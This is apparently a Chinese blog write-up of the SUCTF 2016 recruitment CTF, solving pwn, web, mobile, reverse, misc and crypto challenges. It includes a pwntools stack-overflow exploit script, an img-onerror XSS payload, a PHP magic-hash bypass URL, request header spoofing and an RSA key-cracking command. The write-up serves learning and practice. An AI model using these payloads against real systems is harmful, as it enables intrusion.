---
title: SUCTF 招新赛 Writeup
authorId: rexskz
tags:
  - suctf
  - writeup
categories:
  - Writeup
date: 2016-11-07 03:23
---

本来说好的招新赛，结果南航有一堆老司机混进去做题，而且主办方可以随时放题，因此最终题目难度变得没那么简单了。虽然出题的都是队友（队友：“我才没你这么差的队友呢！”），然而还是由于技术不过关，有些看似基础的东西仍然没有做出来。接下来就把我会做的题目写一下吧。

下面的顺序是按照在页面中显示的顺序，而非难度顺序。

# [PWN] 这是你 hello pwn？

拖进 IDA，看到 `main` 函数是这样的：

```c
int __cdecl main(int argc, const char **argv, const char **envp) {
    int v4; // [sp+1Ch] [bp-64h]@1
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    write(1, "let's begin!\n", 0xDu);
    read(0, &v4, 0x100u);
    return 0;
}
```

显然是缓冲区溢出，然后注意到左边的 Function Window 里面有个 `getflag` 函数，地址为 `0804865D`，内容如下：

```c
int getflag() {
    char format; // [sp+14h] [bp-84h]@4
    char s1;     // [sp+28h] [bp-70h]@3
    FILE *v3;    // [sp+8Ch] [bp-Ch]@1
    v3 = fopen("flag.txt", "r");
    if ( !v3 )
        exit(0);
    printf("the flag is :");
    puts("SUCTF{dsjwnhfwidsfmsainewmnci}");
    puts("now,this chengxu wil tuichu.........");
    printf("pwn100@test-vm-x86:$");
    __isoc99_scanf("%s", &s1);
    if ( strcmp(&s1, "zhimakaimen") )
        exit(0);
    __isoc99_fscanf(v3, "%s", &format);
    return printf(&format);
}
```

因此思路是先输入 112 个字节，然后覆盖 `main` 的返回指针为 `0804865D`，然后输入 `zhimakaimen` 即可，话说那个输出伪终端提示符的句子也真是……

```python
from pwn import *
r = remote('xxx.xxx.xxx.xxx', 10000)
r.send('A' * 112 + '\x5d\x86\x04\x08')
r.interactive()
```

不知道为啥，我在最后写上 `r.send('zhimakaimen')` 并不管用，因此只能手动输入了。

```text
let's begin!
the flag is :SUCTF{dsjwnhfwidsfmsainewmnci}
now,this chengxu wil tuichu.........
pwn100@test-vm-x86:$$ zhimakaimen
SUCTF{5tack0verTlow_!S_s0_e4sy}
```

# [Web] flag 在哪？

打开网址，抓包可以发现在 HTTP 头里面有 Cookie：

```http
Cookie:flag=suctf%7BThi5_i5_a_baby_w3b%7D
```

即可得出 flag。

# [Web] 编码

打开网页，里面有个输入框和一个被 disabled 掉的提交按钮，抓包发现 HTTP 头中有 Password：

```http
Password: VmxST1ZtVlZNVFpVVkRBOQ==
```

扔到 Base64 里面解出来是 `VlROVmVVMTZUVDA9`，一开始看到这编码我一脸懵逼，但是后来发现只需要再扔进 Base64 解几次就行了……最终解出来是 `Su233`。是够 233 的，把它输进去，用 Chrome 修改网页结构让按钮变得可以提交，最终得出 flag：`suctf{Su_is_23333}`。

# [Web] XSS1

只有一个输入框和提交按钮，过滤了 `script` 字符串，于是想到了用标签的 `onerror` 属性：

```text
</pre><img src=# onerror=alert(1)>
```

提交之后可得 flag：`suctf{too_eaSy_Xss}`。

# [Web] PHP是世界上最好的语言

网页内容为空，查看源代码可以看到一段 PHP：

```php
if(isset($_GET["password"]) && md5($_GET["password"]) == "0")
    echo file_get_contents("/opt/flag.txt");
else
    echo file_get_contents("xedni.php");
```

经典的 PHP 两个等号的 Feature，随便找一个 md5 之后是 `0e` 开头的字符串即可。

```text
http://xxx.xxx.xxx.xxx/xedni.php?password=s878926199a
```

得到 flag：`suctf{PHP_!s_the_bEst_1anguage}`。

# [Web] ( ゜- ゜)つロ 乾杯~

AAEncode 编码，本质跟 eval 混淆压缩相似，可以找在线解码器，也可以直接去掉最后调用的部分（这样可以得出一个函数，然后在 Chrome 的控制台中点击进去即可复制内容）。内容是一段 Brainfuck，直接找在线解析器就可以了。得到 flag：`suctf{aAenc0de_and_bra1nf**k}`。

# [Web] 你是谁？你从哪里来？

只允许 http://www.suctf.com 这个服务器访问该页面，修改 Origin 和 X-Forwarded-For 即可：

```http
Origin: http://www.suctf.com
X-Forwarded-For: xxx.xxx.xxx.xxx
```

得到 flag：`suctf{C0ndrulation!_y0u_f1n1shed}`。

# [Web] XSS2

这题不知道坑了多少人，虽然题目名称是 XSS，但是这其实是一道隐写。题目中给的路径 `http://xxx.xxx.xxx.xxx/44b22f2bf7c7cfa05c351a5bf228fee0/xss2.php` 去掉最后的 `xss2.php` 后有列目录权限，可以看到里面有张图片：`914965676719256864.tif`，直接用 `strings` 命令搜索一下即可得到 flag：

```text
root@kali:~/Downloads# strings 914965676719256864.tif | grep suctf
suctf{te1m_need_c0mmun1catlon}</photoshop:LayerText>
```

# [Mobile] 最基础的安卓逆向题

用 `dex2jar` 反编译，用 `jd-gui` 打开之后，在 `MainActivity` 中直接发现了 flag：

```java
String flag = "suctf{Crack_Andr01d+50-3asy}";
```

# [Mobile] Mob200

反编译之后发现 `Encrypt.class` 是 AES 类，key 似乎与图片有些关系，但是 AES 的加密和解密用的是同一个 key，因此直接抄过来即可。折腾了若干次 Java 之后才知道，有些函数不适用于 PC Java，而只能在安卓上用，因此新建了一个项目，将所有用到的代码都复制进来，补全了 `Encrypt.class` 中的解密部分，自己写了一个 `MainActivity`，导入了图片资源，调试工程：

```java
public class Encrypt {
    // ....
    public String doDecrypt(String paramString) {
        try {
            char[] arrayOfChar = new char[16];
            BufferedReader localBufferedReader = new BufferedReader(new InputStreamReader(ContextHolder.getContext().getAssets().open("kawai.jpg")));
            localBufferedReader.skip(424L);
            localBufferedReader.read(arrayOfChar);
            localBufferedReader.close();
            String str = new String(decrypt(Base64.decode(paramString.getBytes(), 2), this.key.getBytes(), charArrayToByteArray(arrayOfChar)));
            return str;
        } catch (Exception localException) {
            localException.printStackTrace();
        }
        return paramString;
    }
    public byte[] decrypt(byte[] paramArrayOfByte1, byte[] paramArrayOfByte2, byte[] paramArrayOfByte3) throws Exception {
        byte[] arrayOfByte = transformKey(paramArrayOfByte2);
        Cipher localCipher = Cipher.getInstance("AES/CFB/PKCS7Padding");
        localCipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(arrayOfByte, "AES"), new IvParameterSpec(paramArrayOfByte3));
        return localCipher.doFinal(paramArrayOfByte1);
    }
}
public class MainActivity extends AppCompatActivity {
    String correct = "XclSH6nZEPVd41FsAsqeChz6Uy+HFzV8Cl9jqMyg6mMrcgSoM0vJtA1BpApYahCY";
    Encrypt encrypt = new Encrypt();
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        String clear = this.encrypt.doDecrypt(this.correct);
        System.out.println(clear);
    }
}
```

得到 flag：`suctf{andr01d_encrypt_s0much_4un}`。

# [Mobile] mips

正如名字所述是一段 MIPS 汇编。我的 MIPS 并不熟，IDA 也没装 MIPS 的插件，然而有个在线网站特别好：https://retdec.com/decompilation/ ，可以将一些常见的汇编转换为可编译通过的 C 代码：

```c
#include <stdint.h>
#include <stdio.h>
#include <string.h>

char * g1 = "\x58\x31\x70\x5c\x35\x76\x59\x69\x38\x7d\x55\x63\x38\x7f\x6a"; // 0x410aa0

int main(int argc, char ** argv) {
    int32_t str = 0; // bp-52
    int32_t str2 = 0; // bp-32
    printf("Input Key:");
    scanf("%16s", &str);
    int32_t v1 = 0; // bp-56
    if (strlen((char *)&str) == 0) {
        if (memcmp((char *)&str2, (char *)&g1, 16) == 0) {
            printf("suctf{%s}\r\n", &str);
        } else {
            puts("please reverse me!\r");
        }
        return 0;
    }
    int32_t v2 = 0; // 0x4008148
    int32_t v3 = v2 + (int32_t)&v1; // 0x4007c0
    unsigned char v4 = *(char *)(v3 + 4); // 0x4007c4
    *(char *)(v3 + 24) = (char)((int32_t)v4 ^ v2);
    v1++;
    while (v1 < strlen((char *)&str)) {
        v2 = v1;
        v3 = v2 + (int32_t)&v1;
        v4 = *(char *)(v3 + 4);
        *(char *)(v3 + 24) = (char)((int32_t)v4 ^ v2);
        v1++;
    }
    if (memcmp((char *)&str2, (char *)&g1, 16) == 0) {
        printf("suctf{%s}\r\n", &str);
    } else {
        puts("please reverse me!\r");
    }
    return 0;
}
```

稍加整理，可以看出来是一个循环，`v4` 本质是 `str[i]`，`v3 + 24` 本质是 `str[i + 5]`。也就是说，这段代码先获取你的输入，然后一个循环将第 i 位的字符异或一下 `i`，因此解密也超级好写：

```c
char g[] = "\x58\x31\x70\x5c\x35\x76\x59\x69\x38\x7d\x55\x63\x38\x7f\x6a";

int main() {
    for (int i = 0; i < strlen(g); i++) {
        printf("%c", g[i] ^ i);
    }
    printf("\n");
}
```

得到 flag：`suctf{X0r_1s_n0t_h4rd}`。

# [Mobile] Mob300

解压 apk 之后发现里面加载了各种平台下的一个叫 `libnative-lib.so` 的文件，于是挑了一个最熟悉的平台：x86，用 IDA 反汇编，发现里面的函数超级少，每个函数的语句也超级少，于是就一点点看了。`Java_com_suctf_naive_MainActivity_getHint(int a1)` 函数里面其实是拼了一个字符串：

```c
v8 = '!ga';
v7 = 'lf e';
v6 = 'ht s';
v5 = 'i ta';
v4 = 'hw s';
v3 = 'seuG';
```

这特么不就是 `Guess what is the flag!`？然后看到 `Java_com_suctf_naive_MainActivity_getFlag(int a1)` 函数和 `flag_gen(void)` 函数内容基本是一样的，里面也在拼字符串：

```c
flag_global = xmmword_5D0;
flag_global[4] = 'uf_0';
flag_global[10] = '}n';
flag_global[22] = '\0';
```

双击 `xmmword_5D0`，然后右键将其转换为字符串，可得：`5_inj_teeM{ftcus`，于是得出 flag：`suctf{Meet_jni_50_fun}`。

# [Misc] 签到

加群，在群文件中可以得到 flag：`suctf{Welc0me_t0_suCTF}`。

# [Misc] Misc-50

下载下来是一个 GIF 图像，每隔六秒刷新一次，图像是一个竖条。后来发现其实是一个浏览大图的窗格，于是用 PS 将所有图层从左到右拼起来即可得到 flag：`suctf{t6cV165qUpEnZVY8rX}`。

# [Misc] Forensic-100

下载下来是一个文件，用 `file` 看一下发现是 Gzip 压缩，用 `gzip` 命令解压。

```text
$ file SU
SU: gzip compressed data, was "SU", last modified: Sat Oct 29 19:43:07 2016, from Unix
$ cat SU | gzip.exe -d
fhpgs{CP9PuHsGx#}
```

前几个肯定是 `suctf`，后面的按照规律解也可以，其实这是个 rot13，直接找个在线工具解了就行：`suctf{PC9ChUfTk# }`。

# [Misc] 这不是客服的头像嘛。。。。23333

下载下来是一张图片，用 `file` 看也是一张图片，然而用 `binwalk` 之后发现里面有个压缩包，用 `dd` 命令提取出来：

```text
$ binwalk xu.jpg

DECIMAL         HEX             DESCRIPTION
-------------------------------------------------------------------------------------------------------
46046           0xB3DE          RAR archive data

$ dd if=xu.jpg of=xu.rar bs=1 skip=46046
20221+0 records in
20221+0 records out
20221 bytes (20 kB) copied, 0.294344 s, 68.7 kB/s
```

解压发现是一个 img 镜像（吐槽一下这丧心病狂的压缩率，能把 1440 压成 20……），打开发现是四张图片，分别是一个二维码的四个角，把它们拼起来，扫一下即可：`suctf{bOQXxNoceB}`。

# [Re] 先利其器

可以看出来里面是一个循环，循环结束后 `num` 为零，然后判断如果 `num` 不为零则显示答案。虽然可以 patch 二进制将这句话 nop 掉，但是由于这么简单，还是直接看伪代码吧。

```c
if ( num > 9 ) {
    plaintext = 'I';
    flag(&plaintext);
}
```

```c
signed int __cdecl flag(int *ret) {
    ret[12] = 'a';
    ret[11] = '6';
    ret[10] = 'I';
    ret[9] = '_';
    ret[8] = 'e';
    ret[7] = '5';
    ret[6] = 'U';
    ret[5] = '_';
    ret[4] = 'n';
    ret[3] = '@';
    ret[2] = 'c';
    return 1;
}
```

再加上循环里有一句 `flag[1] = '_';`，于是就拼出来了：`suctf{I_c@n_U5e_I6a}`。

# [Re] PE_Format

发现文件头的 PE 和 MZ 标志刚好反了，于是将其改正，然后将 PE 文件头的位置从 `40` 改为 `80`，即可运行程序，然而程序没啥反应，于是上 IDA（居然是 x64 的）。

```c
for ( i = 0; i < len; ++i ) {
    ans2[i] = ans[i];
    ans[i] = ~ans[i];
}
```

然后判断如果你的输入（`ans`）加密后跟 `secret` 相等则通过。`secret` 的内容是一段二进制：

```text
.data:0000000000476010 ; char secret[23]
.data:0000000000476010 secret  db 0BBh
.data:0000000000476011         db  90h ;
.data:0000000000476012         db 0A0h ;
.data:0000000000476013         db 0A6h ;
.data:0000000000476014         db  90h ;
.data:0000000000476015         db  8Ah ;
.data:0000000000476016         db 0A0h ;
.data:0000000000476017         db  94h ;
.data:0000000000476018         db  91h ;
.data:0000000000476019         db  90h ;
.data:000000000047601A         db  88h ;
.data:000000000047601B         db 0A0h ;
.data:000000000047601C         db 0AFh ;
.data:000000000047601D         db 0BAh ;
.data:000000000047601E         db 0A0h ;
.data:000000000047601F         db 0B9h ;
.data:0000000000476020         db  90h ;
.data:0000000000476021         db  8Dh ;
.data:0000000000476022         db  92h ;
.data:0000000000476023         db  9Eh ;
.data:0000000000476024         db  8Bh ;
.data:0000000000476025         db 0C0h ;
.data:0000000000476026         db    0
```

于是随手写一段程序即可：

```c++
#include <cstdio>
#include <cstring>

char secret[] = {0xBB, 0x90, 0xA0, 0xA6, 0x90, 0x8A, 0xA0, 0x94, 0x91, 0x90, 0x88, 0xA0, 0xAF, 0xBA, 0xA0, 0xB9, 0x90, 0x8D, 0x92, 0x9E, 0x8B, 0xC0, 0x00};

int main() {
    for (int i = 0; i < strlen(secret); i++) {
        secret[i] = ~secret[i];
    }
    printf("%s\n", secret);
}
```

得出 flag：`suctf{Do_You_know_PE_Format?}`。

# [Re] Find_correct_path

上 IDA 分析：

```c
scanf("%s", &v5);
if ( v7 ) {
    switch ( v7 ) {
    case 1:
        choose1(&choice);
        break;
    case 2:
        choose2(&choice);
        break;
    case 3:
        choose3(&choice);
        break;
    case 4:
        choose4(&choice);
        break;
    }
    v6 = strlen(&choice);
    final(&choice, v6);
    result = 0;
} else {
    result = 1;
}
```

读入了 `v5`，然而判断了 `v7`，而且 `v5` 在 `v7` 前面，当然可以当 PWN 来做，但是更简单的方法是直接修改二进制，将第一句改为 `scanf("%d", &amp;v7)` 即可，只需要改一个字符和一个地址。然后在 Linux 下运行即可，分别输入 1~4 看看结果如何：

```text
root@kali:~# ./Which_way_is_correct_rex
1
T2l1_w1y_lT_r!8Tt
root@kali:~# ./Which_way_is_correct_rex
2
Th15_3ad_ls__!8he
root@kali:~# ./Which_way_is_correct_rex
3
Thl5_way_ls_r!8ht
root@kali:~# ./Which_way_is_correct_rex
4
Thl5lwaycTsTr7Tht
```

很显然 3 是正确的，于是得到 flag：`suctf{Thl5_way_ls_r!8ht}`。

# [Re] reverse04

吐槽一下，首先文件名是 `reverse03 .exe`（嗯，还有个空格），其次里面有各种系统调用和反调试。

先输入用户名和密码，然后利用三个替换规则分别对用户名的 0~3 位、4~7 位、8~11 位进行替换，结果存在字符串 `flag` 的特定区域（在代码中有写到 `flag` 的一些值为 `flag{xxxxxxxxxxxxxxxxx}`），然后对该区域进行一个 +1 的凯撒加密，判断与输入的密码是否相等。恶心就恶心在替换过程，`trans1` 使用了 `GetTickCount` 判断是否在调试，`trans2` 判断系统中是否有 `idaq.exe` 和 `idaq64.exe` 进程，`trans3` 使用了 `IsDebuggerPresent` 和 `__readfsdword` 判断是否在调试，这些判断的方法最终影响到了 `x1` 和 `x2`，然而第 i 个替换规则是这样的：`flag[X + 5] = Dict[i][F(x1, x2) + username[X]]`，其中 `F` 函数返回一个整数，`username[X]` 要取 ASCII 码。由于我不会系统调用，因此直接手动枚举的（反正替换的区域互不影响，最差也只需要六次枚举），最终得到 flag：`suctf{antidebugabc}`。

# [Crypto] base??

根据题目提示猜想是 Base64，然而并不是，试了 Base32 可以了：`suctf{I_1ove_Su}`。

# [Crypto] 凯撒大帝

根据提示是凯撒密码，将给的数字拆成 ASCII 的形式，然后按照 +4, +4, +15, +15, +4, +4... 的规律解码就可以了：`suctf{I_am_Caesar}`。

# [Crypto] easyRSA

注意到 public_key 超级短，因此可以用 `RsaCtfTool` 工具直接暴力破解出 private_key：

```text
$ python RsaCtfTool.py --pkey ../easyRSA/public.key --pri > ../easyRSA/private.key
```

然后就可以用 `openssl` 来对数据进行解密了，得到 flag：`suctf{Rsa_1s_ea5y}`。话说谁说 RSA 简单的，明明只是 key 短。

# [Crypto] 普莱费尔

有在线的解密工具，先将下面一串 `WW91IGFyZSBsdWNreQ==` 翻译成 `You are lucky`，然后用它做 key，翻译上面的内容即可。得到 flag：`suctf{charleswheatstone}`。

# [Crypto] 很贱蛋呀

查看 `En.py` 文件，发现每一轮的 key 都不一样，而且每一位互不影响，群里也说答案都是可见字符，因此三重循环，第一重枚举 key，第二重枚举字符位置，第三重枚举该位置的字符：

```c++
#include <cstdio>
#include <cstring>

unsigned char cipher[30] = {75, 30, 30, 215, 104, 138, 69, 213, 248, 30, 179, 212, 105, 33, 213, 249, 105};
int len = strlen((char *)cipher);

unsigned char result[30] = {0};
int index = 0;

char solve(int key, int enc) {
    for (int x = 32; x <= 127; x++) {
        int am = (key + x) / 2;
        int gm = key * x;
        if ((am + gm) % 255 == enc) {
            return x;
        }
    }
    return 0;
}

bool deal(int key) {
    index = 0;
    for (int i = 0; i < len; i++) {
        if ((result[index++] = solve(key, cipher[i])) == 0) {
            return false;
        }
    }
    return true;
}

int main() {
    for (int key = 0; key < 128; key++) {
        if (deal(key * 101)) {
            printf("Found key = %d\n", key);
            printf("%s\n", result);
        }
    }
    return 0;
}
```

```text
Found key = 110
Goodlucktobreakme
```

最终得出 flag：`suctf{Goodlucktobreakme}`。

----

这次懒得写结尾了……
